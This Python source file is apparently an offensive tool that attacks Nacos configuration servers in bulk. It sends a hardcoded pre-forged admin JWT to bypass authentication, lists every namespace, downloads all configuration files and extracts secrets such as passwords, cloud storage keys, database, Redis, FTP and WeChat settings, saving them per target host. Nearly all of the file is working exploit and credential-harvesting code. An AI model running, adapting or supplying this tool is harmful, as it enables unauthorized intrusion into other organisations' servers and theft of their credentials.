from moudle import common
import json
import os.path
import requests
import yaml
from urllib.parse import urlparse
import urllib3
from requests.adapters import HTTPAdapter

# 关闭ssl警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# accessToken = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3NTA4Mzg3N30.mIjNX6MXNF3FgQNTl-FduWpsaTSZrOQZxTCu7Tg46ZU"

proxy = {
    "socks5": 'socks5://127.0.0.1:1080'
}


class NacosConfig:
    """
        已知 accessToken 获取所有配置文件
    """

    def __init__(self, url, accessToken):
        self.url = url
        self.accessToken = accessToken
        self.header = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Authorization": "{\"accessToken\":\"" + self.accessToken + "}\",\"tokenTtl\":18000,\"globalAdmin\":true,\"username\":\"nacos\"}",
            "X-Requested-With": "XMLHttpRequest", "Referer": url,
            "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers",
            "Connection": "close"}

        # 期望提取的key
        self.niceKey = ["aliyun", "oss", "datasource", "redis", "ftp", "server", "wechat", "store", "minio"]
        self.nicePropertiesKey = ["password", "minio"]

        # result
        self.namespaces = []
        self.contents = {'json': [], 'properties': [], 'yaml': [], 'UNKNOWN': []}
        self.values = set()

    def run(self):
        try:
            self.getNamespaces()
            self.getConfigs()
            self.findKeyValues()
            self.save()
        except Exception as e:
            common.Print(e[:10]).err()
            pass
        finally:
            return self.values

    def findKeyValues(self):
        """
            期望值解析
        """
        for content in self.contents['yaml']:
            yaml_data = yaml.safe_load(content)
            for key in self.niceKey:
                tvalue = {key: self.findYamlKeyValue(yaml_data, key)}
                if tvalue[key] is not None:
                    self.values.add(str(tvalue))

        for content in self.contents['json']:
            json_data = json.loads(content)
            for key in self.niceKey:
                tvalue = {key: self.findJSONKeyValue(json_data, key)}
                if tvalue[key] is not None:
                    self.values.add(str(tvalue))
            pass

        for content in self.contents['properties']:
            for key in self.nicePropertiesKey:
                tvalue = {key: self.findPropertiesKeyValue(content, key, False)}
                if tvalue[key] is not None:
                    self.values.add(str(tvalue))

    def findPropertiesKeyValue(self, content, key, flag):
        value = set()
        if flag:
            for line in content.splitlines():
                if line.startswith("#"):
                    continue
                if line.startswith(key):
                    value.add(line)
            return value
        else:
            for line in content.splitlines():
                if line.startswith("#"):
                    continue
                sp = line.split(key)
                if len(sp) > 1:
                    return self.findPropertiesKeyValue(content, sp[0], True)

            # if key in line:
            #     print(line)
        return None

    def findJSONKeyValue(self, json_data, target_key):
        """
        递归查找json中的key对应Value值
        """
        if isinstance(json_data, dict):
            # 遍历字典的键值对
            for key, value in json_data.items():
                # 如果找到目标键，返回对应的值
                if key == target_key:
                    return value
                # 如果当前值是一个嵌套的字典或列表，递归调用函数查找
                elif isinstance(value, (dict, list)):
                    result = self.findJSONKeyValue(value, target_key)
                    if result is not None:
                        return result
        elif isinstance(json_data, list):
            # 遍历列表的元素
            for item in json_data:
                # 如果当前元素是一个嵌套的字典或列表，递归调用函数查找
                if isinstance(item, (dict, list)):
                    result = self.findJSONKeyValue(item, target_key)
                    if result is not None:
                        return result
        return None

    def findYamlKeyValue(self, yaml_data, key):
        """
        递归查找yaml中的key对应Value值
        """
        if isinstance(yaml_data, dict):
            for k, v in yaml_data.items():
                if k == key:
                    return v
                else:
                    result = self.findYamlKeyValue(v, key)
                    if result is not None:
                        return result
        elif isinstance(yaml_data, list):
            for item in yaml_data:
                result = self.findYamlKeyValue(item, key)
                if result is not None:
                    return result
        else:
            return

    def getNamespaces(self):
        """
        获取所有的命名空间配置
        """
        configurl = self.url + "v1/console/namespaces?accessToken={}&namespaceId=".format(self.accessToken)
        # response = requests.get(configurl, headers=self.header, timeout=10, verify=False, proxies=proxy)
        response = requests.get(configurl, headers=self.header, timeout=10, verify=False)
        if response.status_code != 200:
            return
        response_data = response.json()
        for item in response_data['data']:
            self.namespaces.append(item['namespace'])

    def getConfigs(self):
        if len(self.namespaces) <= 0:
            return
        for namespace in self.namespaces:
            try:
                configsUrl = self.url + "v1/cs/configs?dataId=&group=&appName=&config_tags=&pageNo=1&pageSize=10&tenant={}&search=accurate&accessToken={}&username={}".format(
                    namespace, self.accessToken, "nacos")
                # response = requests.get(configsUrl, headers=self.header, timeout=10, verify=False, proxies=proxy)
                response = requests.get(configsUrl, headers=self.header, timeout=10, verify=False)
                response_data = response.json()
                for item in response_data['pageItems']:
                    dataId = item["dataId"]
                    if dataId.endswith(".properties"):
                        self.contents['properties'].append(item["content"])
                    elif dataId.endswith(".yaml") or dataId.endswith(".yml"):
                        self.contents['yaml'].append(item["content"])
                    elif dataId.endswith(".json"):
                        self.contents['json'].append(item["content"])
                    else:
                        self.contents['UNKNOWN'].append(item["content"])
            except Exception as e:
                continue

    def save(self):
        # print(self.contents)
        if len(self.contents['json']) <= 0 and len(self.contents['properties']) <= 0 and len(
                self.contents['yaml']) <= 0 and len(self.contents['UNKNOWN']) <= 0:
            # if len(self.values) <= 0:
            return

        folder_name = "result"
        if not os.path.exists(folder_name):
            os.mkdir(folder_name)

        file_name = folder_name + "/" + urlparse(self.url).netloc + ".txt"

        file_name = file_name.replace(":", "_")

        # 写入文件内容
        with open(file_name, "w") as file:
            for values in self.contents.values():
                for value in values:
                    file.write(value + "\n")
        common.Print("File created and write all config: " + file_name).star()


class Manager:
    def __init__(self, url, uf, accesstoken, username, password):
        self.accesstoken = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3NTA4Mzg3N30.mIjNX6MXNF3FgQNTl-FduWpsaTSZrOQZxTCu7Tg46ZU"
        self.username = username
        self.password = password
        self.url = url
        self.uf = uf
        self.urls = set()

        # 直接用token
        if accesstoken is not None:
            self.accesstoken = accesstoken

    def run(self):
        if self.uf is not None:
            common.Print("format url files...").info()
            self.urls = common.common().urls_format(self.uf)
            if len(self.urls) == 0:
                common.Print("文件内容预解析重定向失败").err()
                return
        elif self.url is not None:
            common.Print("format url...").info()
            url = common.common().url_format(self.url)
            self.urls.add(url)

        common.Print("jwt token access").info()
        for turl in self.urls:
            try:
                # 指定账号的话先登陆获取token
                if self.username is not None and self.password is not None:
                    common.Print("login get accesstoken...").info()
                    token = common.common().login_get_accesstoken(turl, self.username, self.password)
                    if token is not None:
                        self.accesstoken = token

                common.Print("start scan {}".format(turl)).log()
                value = NacosConfig(turl, self.accesstoken).run()
                if len(value) != 0:
                    common.Print("find config {}".format(turl)).star()
                    for item in value:
                        common.Print(item).print()
                    common.Print("\n\n").print()
            except Exception as e:
                pass


if __name__ == '__main__':
    pass
